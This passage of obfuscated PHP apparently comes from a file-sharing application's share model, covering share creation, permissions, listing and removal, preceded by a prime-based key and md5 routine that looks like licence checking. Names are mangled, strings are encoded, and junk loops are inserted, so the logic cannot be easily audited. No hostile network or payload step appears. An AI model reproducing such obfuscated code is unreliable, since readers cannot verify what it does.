$ŒĞñ¨™È = intval(($Â¹çø¢½ * $¡Î²Ó¿Ù + 1) / $ŸÙ‰ĞÑØ); break; } } $¸Ùºô±£ = $this->nqtc058e3ce5($™üíŠø­ * $…¢±á–§ . $âõõìÁ£[6], $âõõìÁ£[136]); $£œ‹Ş… = $ÏÓ¥úÄş[820]; $’¢÷§» = md5($âõõìÁ£[304] . ($™üíŠø­ + $…¢±á–§) . $âõõìÁ£[305] . $ŸÙ‰ĞÑØ . $âõõìÁ£[305] . $ŒĞñ¨™È . $âõõìÁ£[306]); $åşµõ•ğ = $ÏÓ¥úÄş[821]; if (strlen($åşµõ•ğ) < $ÏÓ¥úÄş[66]) { die; } $ÜÙ·»İÜ = $this->nqtc058e3ce5($°¢š´°, $’¢÷§») . $âõõìÁ£[307] . $¸Ùºô±£; return $ÜÙ·»İÜ; $­ú©Å¥ = $ÏÓ¥úÄş[812]; if (!$­ú©Å¥) { return; } } public function olhwee7f1482($¹Ãàé‡à) { $å²ßÆ£ =& $_SERVER[÷ôÚîå]; $‚È£Õ =& $_SERVER[ü÷’á¨À]; $Š³ÚŸ‰ = explode($‚È£Õ[307], $¹Ãàé‡à); $¡ë¶ÁäŸ = $å²ßÆ£[822]; if (strlen($¡ë¶ÁäŸ) < $å²ßÆ£[66]) { die; } if (count($Š³ÚŸ‰) != 2) { return $‚È£Õ[6]; } $•åôØùõ = $this->uwada3c9af0f($Š³ÚŸ‰[1] . $‚È£Õ[6], $‚È£Õ[136]); $íª†œŒ† = $å²ßÆ£[823]; if (strlen($íª†œŒ†) < $å²ßÆ£[711]) { return; } if (!$•åôØùõ) { return $‚È£Õ[6]; } $•åôØùõ = intval($•åôØùõ); $­ıû³ôİ = 0; $áÒ§·òú = 0; $ÈëÂªß = $å²ßÆ£[824]; while ($ÈëÂªß < $å²ßÆ£[693]) { if ($ÈëÂªß >= 0) { break; } $ÈëÂªß++; } for ($²ñ”Íú  = 3; $²ñ”Íú  < $•åôØùõ; $²ñ”Íú  += 2) { if ($•åôØùõ % $²ñ”Íú  != 0) { continue; } $­ıû³ôİ = $²ñ”Íú ; $¶ƒĞ·¦Ò = $å²ßÆ£[825]; $áÒ§·òú = intval($•åôØùõ / $²ñ”Íú ); $„«©¹Á = $å²ßÆ£[826]; if (strlen($„«©¹Á) < $å²ßÆ£[697]) { return; } break; } $õ–Ú¶…¦ = ($­ıû³ôİ - 1) * ($áÒ§·òú - 1); $³ñ§ßÂ« = intval(($­ıû³ôİ + $áÒ§·òú) / 2); $­‚É¢¡ = $å²ßÆ£[827]; if (!$­‚É¢¡) { return; } while (1) { $µÇÆÅâ£ = $³ñ§ßÂ«; $¡ñæ­Ì¿ = $õ–Ú¶…¦; $å­ø¹Ò¢ = $å²ßÆ£[828]; while (strlen($å­ø¹Ò¢) < $å²ßÆ£[66]) { if (!$å­ø¹Ò¢) { break; } $å­ø¹Ò¢++; } while ($¡ñæ­Ì¿ % $µÇÆÅâ£ != 0) { $´–æŒ¼ = $¡ñæ­Ì¿; $¡ñæ­Ì¿ = $µÇÆÅâ£; $µÇÆÅâ£ = $´–æŒ¼ % $µÇÆÅâ£; $àëÚœÆ = $å²ßÆ£[829]; while ($àëÚœÆ < $å²ßÆ£[697]) { if ($àëÚœÆ >= 0) { break; } $àëÚœÆ++; } } if ($µÇÆÅâ£ == 1) { break; } else { $³ñ§ßÂ«++; } } $¯²®ò‚ñ = 2; for ($²ñ”Íú  = 0; $²ñ”Íú  < $õ–Ú¶…¦ * 10; $²ñ”Íú ++) { if (($õ–Ú¶…¦ * $²ñ”Íú  + 1) % $³ñ§ßÂ« == 0) { $¯²®ò‚ñ = intval(($õ–Ú¶…¦ * $²ñ”Íú  + 1) / $³ñ§ßÂ«); break; } } $»Ÿ¤òÍÚ = md5($‚È£Õ[304] . ($­ıû³ôİ + $áÒ§·òú) . $‚È£Õ[305] . $³ñ§ßÂ« . $‚È£Õ[305] . $¯²®ò‚ñ . $‚È£Õ[306]); $Ù¦‰¬Ëí = $å²ßÆ£[830]; while (strlen($Ù¦‰¬Ëí) < $å²ßÆ£[693]) { if (!$Ù¦‰¬Ëí) { break; } $Ù¦‰¬Ëí++; } $ËßÍÊÀğ = $this->uwada3c9af0f($Š³ÚŸ‰[0], $»Ÿ¤òÍÚ); return $ËßÍÊÀğ; } public function sqxif8e8bfb7() { $ëî½§Î† =& $_SERVER[÷ôÚîå]; $üµû‰‚€ = mt_rand(pow(2, 14), pow(2, 16) - 1); $ «Ã¢§í = array(); $›ñºŞ› = $ëî½§Î†[831]; $˜ĞŒ‰úµ = 1; while ($˜ĞŒ‰úµ <= (int) sqrt($üµû‰‚€)) { $¢¶”İ€Æ = $˜ĞŒ‰úµ; $™âù—Ğ’ = $ëî½§Î†[832]; if (!$™âù—Ğ’) { return; } while (!0) { $¢¶”İ€Æ++; if ($¢¶”İ€Æ <= 2) { $˜ĞŒ‰úµ = $¢¶”İ€Æ; break; } else { if ($¢¶”İ€Æ < 2) { continue; } } $ÉğÑÙ®¾ = !0; for ($«÷ÜÄŸ = 2; $«÷ÜÄŸ <= sqrt($¢¶”İ€Æ); $«÷ÜÄŸ++) { if ($¢¶”İ€Æ % $«÷ÜÄŸ == 0) { $ÉğÑÙ®¾ = !1; } } if ($ÉğÑÙ®¾) { $˜ĞŒ‰úµ = $¢¶”İ€Æ; break; } } $ «Ã¢§í[] = $˜ĞŒ‰úµ; } $›‚¢Ö© = 2; $ŠûÏçŒ— = $ëî½§Î†[833]; while ($ŠûÏçŒ— < $ëî½§Î†[693]) { if ($ŠûÏçŒ— >= 0) { break; } $ŠûÏçŒ—++; } for ($¢¶”İ€Æ = $üµû‰‚€; $¢¶”İ€Æ > 1; $¢¶”İ€Æ--) { $ÉğÑÙ®¾ = !0; foreach ($ «Ã¢§í as $ˆÇ£®±ä) { if ($¢¶”İ€Æ % $ˆÇ£®±ä == 0) { $ÉğÑÙ®¾ = !1; break; } } if ($ÉğÑÙ®¾) { $›‚¢Ö© = $¢¶”İ€Æ; break; } } return $›‚¢Ö©; $‹Ê´Â¡â = $ëî½§Î†[834]; if (!$‹Ê´Â¡â) { return; } } public function vglc9d6a43bb($Ûˆ‚·, $¶õŸë í) { $øşöü²â =& $_SERVER[÷ôÚîå]; $éĞ÷µóª =& $_SERVER[ü÷’á¨À]; return call_user_func(array($éĞ÷µóª[8], $éĞ÷µóª[308]), $Ûˆ‚·, $¶õŸë í); $ùÉÓ’ â = $øşöü²â[835]; while (strlen($ùÉÓ’ â) < $øşöü²â[693]) { if (!$ùÉÓ’ â) { break; } $ùÉÓ’ â++; } } public function nqtc058e3ce5($çÈïÒÊó, $îàµ™ö²) { $ß‘¸€¥ =& $_SERVER[ü÷’á¨À]; return call_user_func(array($ß‘¸€¥[309], $ß‘¸€¥[310]), $çÈïÒÊó, $îàµ™ö²); $ÎÀñËÅ• = $_SERVER[÷ôÚîå][836]; if (!$ÎÀñËÅ•) { return; } } public function uwada3c9af0f($üöôù¤Æ, $æ§ŒŸùÒ) { $„âÁ‹š· =& $_SERVER[ü÷’á¨À]; return call_user_func(array($„âÁ‹š·[309], $„âÁ‹š·[311]), $üöôù¤Æ, $æ§ŒŸùÒ); } } goto aæÁ°’Üª; d¬¯ë•¬ó: class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\x65"; protected $dataAuto = array(array("\x6d\157\144\x69\146\171\x54\x69\x6d\145", "\x74\x69\x6d\145", "\x69\156\163\145\162\x74\54\165\160\144\x61\164\x65", "\146\165\156\x63\x74\151\x6f\x6e"), array("\x63\x72\x65\141\x74\x65\x54\151\x6d\x65", "\x74\x69\x6d\145", "\151\156\x73\145\x72\x74", "\146\x75\x6e\143\164\x69\x6f\156"), array("\x6f\x70\164\151\x6f\x6e\x73", '', "\x69\156\x73\145\162\164\x2c\165\x70\144\x61\x74\x65\x2c\x73\145\x6c\x65\x63\164", "\x6a\x73\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($¥½·ˆì•) { $ˆî¢§ä =& $_SERVER[÷ôÚîå]; $‚†ÀèÄ = isset($¥½·ˆì•[0]) ? $¥½·ˆì•[0] : !1; return array($ˆî¢§ä[2121] => array(USER_ID, $ˆî¢§ä[2122]), $ˆî¢§ä[2062] => array($‚†ÀèÄ, $ˆî¢§ä[2123])); } protected function listSimple() { $ÈºÓßÍÊ = array($_SERVER[÷ôÚîå][1779] => USER_ID); $şĞò¥¦Ì = $this->field($this->fieldList)->where($ÈºÓßÍÊ)->select(); return $şĞò¥¦Ì ? $şĞò¥¦Ì : array(); } protected function getInfo($ÈÉ´Ùó¹, $³ÁÅÑ€µ = false) { $áÜ± =& $_SERVER[÷ôÚîå]; if ($³ÁÅÑ€µ) { return $this->_getShareInfo(array($áÜ±[674] => $ÈÉ´Ùó¹)); } $ùşÉû–¹ = $this->cacheFunctionGet($áÜ±[2064], $ÈÉ´Ùó¹); return $ùşÉû–¹; } public function getInfoByHash($â†¨¡®) { return $this->_getShareInfo(array($_SERVER[÷ôÚîå][2124] => $â†¨¡®)); } public function getInfoByPath($Ô±Ñïş) { $—î¥ÑØ =& $_SERVER[÷ôÚîå]; $ëó‹¨’ = array($—î¥ÑØ[1779] => USER_ID, $—î¥ÑØ[203] => $Ô±Ñïş); return $this->_getShareInfo($ëó‹¨’); } public function getInfoBySourcePath($¨Ó®«î) { $ëÏÇËÁí =& $_SERVER[÷ôÚîå]; $ğúİùÎé = array($ëÏÇËÁí[1779] => USER_ID, $ëÏÇËÁí[1268] => $¨Ó®«î); return $this->_getShareInfo($ğúİùÎé); } private function _getShareInfo($ÕÇÎÃÈ) { $«ºËÊÑè =& $_SERVER[÷ôÚîå]; $Ø¤Ş¦ÂÑ = $this->where($ÕÇÎÃÈ)->find(); if (!$Ø¤Ş¦ÂÑ) { return !1; } $ÕÇÎÃÈ = array($«ºËÊÑè[674] => $Ø¤Ş¦ÂÑ[$«ºËÊÑè[674]]); $£—€¾õŸ = $«ºËÊÑè[2125]; $…çµà¯ = Model($«ºËÊÑè[675])->order($«ºËÊÑè[484])->field($£—€¾õŸ)->where($ÕÇÎÃÈ)->select(); if ($Ø¤Ş¦ÂÑ[$«ºËÊÑè[203]] == $«ºËÊÑè[238]) { $Ø¤Ş¦ÂÑ[$«ºËÊÑè[100]] = IO::info($Ø¤Ş¦ÂÑ[$«ºËÊÑè[1268]]); } else { $Ø¤Ş¦ÂÑ[$«ºËÊÑè[100]] = Model($«ºËÊÑè[1429])->pathInfo($Ø¤Ş¦ÂÑ[$«ºËÊÑè[203]]); } $Ø¤Ş¦ÂÑ[$«ºËÊÑè[2126]] = $…çµà¯; return $Ø¤Ş¦ÂÑ; } protected function getInfoAuth($º¡áË„ş) { $·Ìš„†š =& $_SERVER[÷ôÚîå]; $ôºÎÅÎ“ = $this->getInfo($º¡áË„ş); if ($ôºÎÅÎ“[$·Ìš„†š[1779]] == USER_ID) { $ôºÎÅÎ“[$·Ìš„†š[496]] = $ôºÎÅÎ“[$·Ìš„†š[100]][$·Ìš„†š[496]]; } else { $ôºÎÅÎ“[$·Ìš„†š[496]] = Model($·Ìš„†š[576])->authMake($ôºÎÅÎ“[$·Ìš„†š[2126]]); } return $ôºÎÅÎ“; } protected function listData($ÛğÆ’£Ç = null, $‹­Ü³©ç = 300) { $¿©ÊûËæ =& $_SERVER[÷ôÚîå]; $¹Îõµµ¢ = array(array($¿©ÊûËæ[571] => array($¿©ÊûËæ[1101], 0), $¿©ÊûËæ[672] => array($¿©ÊûËæ[1101], 0), $¿©ÊûËæ[2127] => $¿©ÊûËæ[2080])); if ($ÛğÆ’£Ç == $¿©ÊûËæ[2128]) { $¹Îõµµ¢ = array($¿©ÊûËæ[571] => 1); } else { if ($ÛğÆ’£Ç == $¿©ÊûËæ[1253]) { $¹Îõµµ¢ = array($¿©ÊûËæ[672] => 1); } } $¹Îõµµ¢[$¿©ÊûËæ[1779]] = USER_ID; $’·¡¾º‰ = $this->where($¹Îõµµ¢)->selectPage($‹­Ü³©ç); return $’·¡¾º‰; } protected function listToMe($»»°ŠÖ = 300) { $ ™«ø ‹ =& $_SERVER[÷ôÚîå]; $”Ğşí±Â = Model($ ™«ø ‹[2129])->userGroupParents(USER_ID); $…ÑĞÊ°¤ = array($ ™«ø ‹[657] => SourceModel::TYPE_USER, $ ™«ø ‹[578] => USER_ID); if ($”Ğşí±Â) { $…ÑĞÊ°¤ = array(array($ ™«ø ‹[657] => SourceModel::TYPE_USER, $ ™«ø ‹[578] => USER_ID), array($ ™«ø ‹[657] => SourceModel::TYPE_GROUP, $ ™«ø ‹[578] => array($ ™«ø ‹[7], $”Ğşí±Â)), $ ™«ø ‹[2127] => $ ™«ø ‹[2080]); } $ÖŠ—¼ç = Model($ ™«ø ‹[675])->where($…ÑĞÊ°¤)->selectPage($»»°ŠÖ); $ÜĞÜ§Ê = array_to_keyvalue_group($ÖŠ—¼ç[$ ™«ø ‹[454]], $ ™«ø ‹[674]); if (!$ÜĞÜ§Ê) { return $ÖŠ—¼ç; } $…ûŒ­š÷ = $ ™«ø ‹[2130]; $…ÑĞÊ°¤ = array($ ™«ø ‹[674] => array($ ™«ø ‹[501], array_keys($ÜĞÜ§Ê)), $ ™«ø ‹[1779] => array($ ™«ø ‹[1103], $ ™«ø ‹[238])); $¯Üß®€ = $this->field($…ûŒ­š÷)->where($…ÑĞÊ°¤)->select(); foreach ($¯Üß®€ as $ñºÚŒî => &$†­İ½éÔ) { $†­İ½éÔ[$ ™«ø ‹[2126]] = $ÜĞÜ§Ê[$†­İ½éÔ[$ ™«ø ‹[674]]]; } unset($†­İ½éÔ); $÷Ë·ïº = array($ ™«ø ‹[2131] => $¯Üß®€, $ ™«ø ‹[2132] => $ÖŠ—¼ç[$ ™«ø ‹[451]]); return $÷Ë·ïº; } protected function shareAdd($³á¥©¾¤, $•¦ÓìÁÛ) { $¶íş®£ =& $_SERVER[÷ôÚîå]; $ÚûÀ¿£Ø = $this->_addShareData($³á¥©¾¤, $•¦ÓìÁÛ); if (!empty($•¦ÓìÁÛ[$¶íş®£[2133]])) { $this->_shareAuthSet($ÚûÀ¿£Ø, $•¦ÓìÁÛ[$¶íş®£[2133]]); } $this->shareEventAdd($³á¥©¾¤, $•¦ÓìÁÛ, $¶íş®£[2134]); return $ÚûÀ¿£Ø; } protected function shareAddSystem($ä¿í°‰¡, $½ò…Ñø±) { $ÑúÛª¾¡ =& $_SERVER[÷ôÚîå]; $ºÅ·¹—ú = $this->_addShareData($ä¿í°‰¡, $½ò…Ñø±, $ÑúÛª¾¡[201]); $this->_shareAuthSet($ºÅ·¹—ú, $½ò…Ñø±[$ÑúÛª¾¡[2133]]); return $ºÅ·¹—ú; } private function shareEventAdd($¤Ä´Á¹â, $şÒØ¹„ª, $è’¿¶ÙÍ = "\x61\x64\x64") { $ã¨ìÜ =& $_SERVER[÷ôÚîå]; if (!$¤Ä´Á¹â || $¤Ä´Á¹â == $ã¨ìÜ[238]) { return; } if ($è’¿¶ÙÍ == $ã¨ìÜ[2134]) { if ($şÒØ¹„ª[$ã¨ìÜ[571]] == $ã¨ìÜ[101]) { Model($ã¨ìÜ[642])->eventShare($¤Ä´Á¹â, $ã¨ìÜ[2135]); } if ($şÒØ¹„ª[$ã¨ìÜ[672]] == $ã¨ìÜ[101]) { Model($ã¨ìÜ[642])->eventShare($¤Ä´Á¹â, $ã¨ìÜ[2136]); } return; } $‹–¾£Ÿ¯ = $this->getInfoByPath($¤Ä´Á¹â); $ØüœúÂ„ = $ã¨ìÜ[2137]; if ($‹–¾£Ÿ¯[$ã¨ìÜ[571]] == $ã¨ìÜ[238] && $şÒØ¹„ª[$ã¨ìÜ[571]] == $ã¨ìÜ[101]) { $ØüœúÂ„ = $ã¨ìÜ[2135]; } if ($‹–¾£Ÿ¯[$ã¨ìÜ[571]] == $ã¨ìÜ[101] && $şÒØ¹„ª[$ã¨ìÜ[571]] == $ã¨ìÜ[238]) { $ØüœúÂ„ = $ã¨ìÜ[2138]; } if ($‹–¾£Ÿ¯[$ã¨ìÜ[672]] == $ã¨ìÜ[238] && $şÒØ¹„ª[$ã¨ìÜ[672]] == $ã¨ìÜ[101]) { $ØüœúÂ„ = $ã¨ìÜ[2136]; } if ($‹–¾£Ÿ¯[$ã¨ìÜ[672]] == $ã¨ìÜ[101] && $şÒØ¹„ª[$ã¨ìÜ[672]] == $ã¨ìÜ[238]) { $ØüœúÂ„ = $ã¨ìÜ[2139]; } Model($ã¨ìÜ[642])->eventShare($¤Ä´Á¹â, $ØüœúÂ„); return; } private function _addShareData($‹À¾ƒ×Í, $å³…ë¹½ = array(), $ª¬–ûº  = false) { $™“ª©¤á =& $_SERVER[÷ôÚîå]; $ã¸çäˆî = $ª¬–ûº  == $™“ª©¤á[201] ? 0 : USER_ID; $ä´¼É¿’ = array($™“ª©¤á[500] => $‹À¾ƒ×Í, $™“ª©¤á[1770] => $ã¸çäˆî); if ($‹À¾ƒ×Í == 0) { $ä´¼É¿’ = array($™“ª©¤á[2140] => $å³…ë¹½[$™“ª©¤á[1268]], $™“ª©¤á[1770] => $ã¸çäˆî); } if ($ıÈ¦˜ÛÌ = $this->where($ä´¼É¿’)->find()) { return $ıÈ¦˜ÛÌ[$™“ª©¤á[674]]; } if ($‹À¾ƒ×Í == 0) { $®Ë‘¥‰ê = array($™“ª©¤á[32] => get_path_this($å³…ë¹½[$™“ª©¤á[97]])); } else { $®Ë‘¥‰ê = Model($™“ª©¤á[914])->sourceInfo($‹À¾ƒ×Í); if (!$®Ë‘¥‰ê) { return !1; } } if (!$å³…ë¹½[$™“ª©¤á[1668]]) { $å³…ë¹½[$™“ª©¤á[1668]] = $®Ë‘¥‰ê[$™“ª©¤á[32]]; } $Ã½ÁœÑ  = array($™“ª©¤á[1770] => $ã¸çäˆî, $™“ª©¤á[500] => $‹À¾ƒ×Í, $™“ª©¤á[1668] => $™“ª©¤á[12], $™“ª©¤á[571] => 0, $™“ª©¤á[672] => 0, $™“ª©¤á[1268] => $™“ª©¤á[12], $™“ª©¤á[392] => $™“ª©¤á[12], $™“ª©¤á[978] => $™“ª©¤á[12], $™“ª©¤á[2141] => 0, $™“ª©¤á[2142] => 0, $™“ª©¤á[850] => 0, $™“ª©¤á[2143] => $™“ª©¤á[12], $™“ª©¤á[2124] => $™“ª©¤á[12]); $ÌàÃµŒ— = explode($™“ª©¤á[50], $™“ª©¤á[2144]); foreach ($ÌàÃµŒ— as $Ì…š·ãÅ) { if (!isset($å³…ë¹½[$Ì…š·ãÅ])) { continue; } $Ã½ÁœÑ [$Ì…š·ãÅ] = $å³…ë¹½[$Ì…š·ãÅ]; } $áÜ€÷Éê = $this->add($Ã½ÁœÑ ); $ó´€¬¶Ã = array($™“ª©¤á[2124] => short_id($áÜ€÷Éê)); $this->where(array($™“ª©¤á[2145] => $áÜ€÷Éê))->save($ó´€¬¶Ã); return $áÜ€÷Éê; } private function _shareAuthSet($¼îï´®š, $°î´Üô·) { $ø«×ãÊ =& $_SERVER[÷ôÚîå]; if (!is_array($°î´Üô·)) { return !1; } $¡ÄØø·½ = Model($ø«×ãÊ[2090]); $¡ÄØø·½->where(array($ø«×ãÊ[674] => $¼îï´®š))->delete(); $ôöå¬×Œ = array(); foreach ($°î´Üô· as $ÃÀ·öß) { $”¡šüë = SourceModel::TYPE_USER; if ($ÃÀ·öß[$ø«×ãÊ[200]] == SourceModel::TYPE_GROUP) { $”¡šüë = SourceModel::TYPE_GROUP; } $†íÜ€é = array($ø«×ãÊ[674] => $¼îï´®š, $ø«×ãÊ[200] => $”¡šüë, $ø«×ãÊ[578] => intval($ÃÀ·öß[$ø«×ãÊ[578]]), $ø«×ãÊ[2086] => 0, $ø«×ãÊ[2146] => -1); if ($ÃÀ·öß[$ø«×ãÊ[2086]]) { $†íÜ€é[$ø«×ãÊ[2086]] = $ÃÀ·öß[$ø«×ãÊ[2086]]; } else { if ($ÃÀ·öß[$ø«×ãÊ[2146]]) { $†íÜ€é[$ø«×ãÊ[2146]] = $ÃÀ·öß[$ø«×ãÊ[2146]]; } } $ôöå¬×Œ[] = $†íÜ€é; } return $¡ÄØø·½->addAll($ôöå¬×Œ, array(), !0); } public function numViewAdd($‡Ÿù×¸¨) { $öçÓòÎØ =& $_SERVER[÷ôÚîå]; $‘™–¢ù = array($öçÓòÎØ[2145] => $‡Ÿù×¸¨); $this->where($‘™–¢ù)->setAdd($öçÓòÎØ[2141]); } public function numDownloadAdd($¼ƒÙ¹é) { $ÎÎ±”æ˜ =& $_SERVER[÷ôÚîå]; $‡ÜÖÓ·÷ = array($ÎÎ±”æ˜[2145] => $¼ƒÙ¹é); $this->where($‡ÜÖÓ·÷)->setAdd($ÎÎ±”æ˜[2142]); } protected function shareEdit($Ê¿õøÙ, $Ñ¦‚’Í™) { $œ“àÍ¶˜ =& $_SERVER[÷ôÚîå]; $ÈûÕğü = $this->getInfo($Ê¿õøÙ); if (!$ÈûÕğü) { return !1; } $this->_checkLinkShare($Ñ¦‚’Í™, $ÈûÕğü); $‰êØ‰¯ = array(); $È¯ú‚¸¸ = explode($œ“àÍ¶˜[50], $œ“àÍ¶˜[2147]); foreach ($È¯ú‚¸¸ as $î‘ö§—) { if (!array_key_exists($î‘ö§—, $Ñ¦‚’Í™)) { continue; } $‰êØ‰¯[$î‘ö§—] = $Ñ¦‚’Í™[$î‘ö§—]; } $this->shareEventAdd($ÈûÕğü[$œ“àÍ¶˜[203]], $Ñ¦‚’Í™, $œ“àÍ¶˜[1947]); $this->where(array($œ“àÍ¶˜[2145] => $Ê¿õøÙ))->save($‰êØ‰¯); if (isset($Ñ¦‚’Í™[$œ“àÍ¶˜[2133]])) { $this->_shareAuthSet($Ê¿õøÙ, $Ñ¦‚’Í™[$œ“àÍ¶˜[2133]]); } return !0; } private function _checkLinkShare($«¦¹÷ÏŠ, $ Àš’×) { $ÀÈ¸ş‘© =& $_SERVER[÷ôÚîå]; if ($«¦¹÷ÏŠ[$ÀÈ¸ş‘©[571]] != $ÀÈ¸ş‘©[101]) { return; } $‘œè™é = $ Àš’×[$ÀÈ¸ş‘©[100]][$ÀÈ¸ş‘©[203]]; if ($ Àš’×[$ÀÈ¸ş‘©[100]][$ÀÈ¸ş‘©[33]] != $ÀÈ¸ş‘©[240]) { $øäÕƒÒ = $this->_folderReport($‘œè™é); if (!$øäÕƒÒ) { return; } show_json(LNG($ÀÈ¸ş‘©[2148]) . $ÀÈ¸ş‘©[2149] . $øäÕƒÒ, !1); } $ãÜ«Â·ß = Model($ÀÈ¸ş‘©[914])->fileInfoGet($ Àš’×[$ÀÈ¸ş‘©[100]][$ÀÈ¸ş‘©[203]]); if (!$ãÜ«Â·ß) { return; } $é«„ëĞ× = $this->shareFileMeta($ãÜ«Â·ß[$ÀÈ¸ş‘©[550]]); if (isset($é«„ëĞ×[$ÀÈ¸ş‘©[459]]) && $é«„ëĞ×[$ÀÈ¸ş‘©[459]] == $ÀÈ¸ş‘©[101]) { show_json(LNG($ÀÈ¸ş‘©[2150]), !1); } } private function _folderReport($åğ÷Äìú) { $Ô˜¨›Î =& $_SERVER[÷ôÚîå]; $˜¬ßÉŸ = array($Ô˜¨›Î[550] => array($Ô˜¨›Î[1101], 0), $Ô˜¨›Î[839] => 3); $øÂŒÇ–¥ = Model($Ô˜¨›Î[2151])->where($˜¬ßÉŸ)->field($Ô˜¨›Î[550])->select(); if (!$øÂŒÇ–¥) { return !1; } $øÂŒÇ–¥ = array_to_keyvalue($øÂŒÇ–¥, $Ô˜¨›Î[12], $Ô˜¨›Î[550]); $•”ó¨×° = $Ô˜¨›Î[50] . $åğ÷Äìú . $Ô˜¨›Î[50]; $˜¬ßÉŸ = array($Ô˜¨›Î[550] => array($Ô˜¨›Î[7], $øÂŒÇ–¥), $Ô˜¨›Î[593] => array($Ô˜¨›Î[468], "\45{$•”ó¨×°}\x25"), $Ô˜¨›Î[514] => 0); $ûáúì© = Model($Ô˜¨›Î[914])->where($˜¬ßÉŸ)->field($Ô˜¨›Î[2152])->find(); if (!$ûáúì©) { return !1; } $Ô–é»ó = substr($ûáúì©[$Ô˜¨›Î[593]], strpos($ûáúì©[$Ô˜¨›Î[593]], $•”ó¨×°)); $˜¬ßÉŸ = array($Ô˜¨›Î[203] => array($Ô˜¨›Î[7], trim($Ô–é»ó, $Ô˜¨›Î[50]))); $™çË­Õ¢ = Model($Ô˜¨›Î[914])->where($˜¬ßÉŸ)->field($Ô˜¨›Î[32])->select(); $Ö«û‡® = array_to_keyvalue($™çË­Õ¢, $Ô˜¨›Î[12], $Ô˜¨›Î[32]); $Ö«û‡®[] = $ûáúì©[$Ô˜¨›Î[32]]; return implode($Ô˜¨›Î[8], $Ö«û‡®); } protected function remove($€¾³ôó¦) { $€° Ä´‰ =& $_SERVER[÷ôÚîå]; $³§óüÔŞ = is_array($€¾³ôó¦) ? $€¾³ôó¦ : array($€¾³ôó¦); for ($Òù¯„í› = 0; $Òù¯„í› < count($³§óüÔŞ); $Òù¯„í›++) { $Æ–«İüÈ = $this->getInfo($³§óüÔŞ[$Òù¯„í›]); if ($Æ–«İüÈ[$€° Ä´‰[672]] == $€° Ä´‰[101]) { Model($€° Ä´‰[642])->eventShare($Æ–«İüÈ[$€° Ä´‰[203]], $€° Ä´‰[2139]); } if ($Æ–«İüÈ[$€° Ä´‰[571]] == $€° Ä´‰[101]) { Model($€° Ä´‰[642])->eventShare($Æ–«İüÈ[$€° Ä´‰[203]], $€° Ä´‰[2138]); } } if (is_array($€¾³ôó¦)) { $€¾³ôó¦ = array($€° Ä´‰[7], $€¾³ôó¦); } $Û¬É»¶ó = array($€° Ä´‰[674] => $€¾³ôó¦); $’³øÅ¿º = $this->where($Û¬É»¶ó)->delete(); if ($’³øÅ¿º) { Model($€° Ä´‰[675])->where(array($€° Ä´‰[674] => $€¾³ôó¦))->delete(); } return $’³øÅ¿º; } protected function removeBySource($öç…Œ¿õ) { $³›Êœ =& $_SERVER[÷ôÚîå]; $ü„ŠÍò¨ = array($³›Êœ[500] => array($³›Êœ[501], $öç…Œ¿õ)); $‚Ÿàóˆ = $this->field($³›Êœ[674])->where($ü„ŠÍò¨)->select(); $‚Ÿàóˆ = array_to_keyvalue($‚Ÿàóˆ, $³›Êœ[12], $³›Êœ[674]); if (!$‚Ÿàóˆ) { return; } $ü„ŠÍò¨ = array($³›Êœ[2145] => array($³›Êœ[501], $‚Ÿàóˆ)); $this->where($ü„ŠÍò¨)->delete(); Model($³›Êœ[675])->where($ü„ŠÍò¨)->delete(); } public function listAll($´—·Î˜) { $Èü‘à·õ =& $_SERVER[÷ôÚîå]; $”¸‡òÍõ = array(); if ($´—·Î˜[$Èü‘à·õ[1779]]) { $”¸‡òÍõ[$Èü‘à·õ[1779]] = $´—·Î˜[$Èü‘à·õ[1779]]; } if ($´—·Î˜[$Èü‘à·õ[849]]) { $ÀšÈ†ºÒ = $´—·Î˜[$Èü‘à·õ[850]] ? $´—·Î˜[$Èü‘à·õ[850]] : strtotime(date($Èü‘à·õ[2153])); $”¸‡òÍõ[$Èü‘à·õ[241]] = array($Èü‘à·õ[418], array($´—·Î˜[$Èü‘à·õ[849]], $ÀšÈ†ºÒ)); } if ($´—·Î˜[$Èü‘à·õ[33]]) { $”¸‡òÍõ[$´—·Î˜[$Èü‘à·õ[33]]] = 1; } else { $”¸‡òÍõ[] = array($Èü‘à·õ[571] => array($Èü‘à·õ[1101], 0), $Èü‘à·õ[672] => array($Èü‘à·õ[1101], 0), $Èü‘à·õ[2127] => $Èü‘à·õ[2080]); } if ($´—·Î˜[$Èü‘à·õ[2076]]) { $”¸‡òÍõ[] = array($Èü‘à·õ[2124] => $´—·Î˜[$Èü‘à·õ[2076]], $Èü‘à·õ[1668] => array($Èü‘à·õ[468], "\45{$´—·Î˜[$Èü‘à·õ[2076]]}\x25"), $Èü‘à·õ[2127] => $Èü‘à·õ[2080]); } $åİ…ó— = $this->_makeOrder()->where($”¸‡òÍõ)->selectPage(20); if (empty($åİ…ó—[$Èü‘à·õ[454]])) { return array(); } $this->_listDataApply($åİ…ó—[$Èü‘à·õ[454]]); return $åİ…ó—; } public function listDataApply($ıò†šÆ) { $this->_listDataApply($ıò†šÆ); return $ıò†šÆ; } private function _listDataApply(&$Äú¯±Ìğ) { $ê‘©Ÿâ¿ =& $_SERVER[÷ôÚîå]; $”ı™îà = array_to_keyvalue($Äú¯±Ìğ, $ê‘©Ÿâ¿[12], $ê‘©Ÿâ¿[1779]); $¾óÔßª² = Model($ê‘©Ÿâ¿[607])->userListInfo(array_unique($”ı™îà)); $º¸À¢Ø = array_to_keyvalue($Äú¯±Ìğ, $ê‘©Ÿâ¿[12], $ê‘©Ÿâ¿[203]); $´ Õ¡»„ = Model($ê‘©Ÿâ¿[914])->sourceListInfo($º¸À¢Ø, !0); foreach ($Äú¯±Ìğ as $Ô¹‹–…ˆ => &$”ªÜâ) { $®ÏØŒ²à = $”ªÜâ[$ê‘©Ÿâ¿[1779]]; $”ªÜâ[$ê‘©Ÿâ¿[2154]] = $¾óÔßª²[$®ÏØŒ²à] ? $¾óÔßª²[$®ÏØŒ²à] : !1; $ºÎœ¡Ò« = $”ªÜâ[$ê‘©Ÿâ¿[203]]; $”ªÜâ[$ê‘©Ÿâ¿[100]] = $´ Õ¡»„[$ºÎœ¡Ò«] ? $´ Õ¡»„[$ºÎœ¡Ò«] : !1; if ($”ªÜâ[$ê‘©Ÿâ¿[100]][$ê‘©Ÿâ¿[514]] == $ê‘©Ÿâ¿[101]) { unset($Äú¯±Ìğ[$Ô¹‹–…ˆ]); } if ($”ªÜâ[$ê‘©Ÿâ¿[100]] != $ê‘©Ÿâ¿[238] && 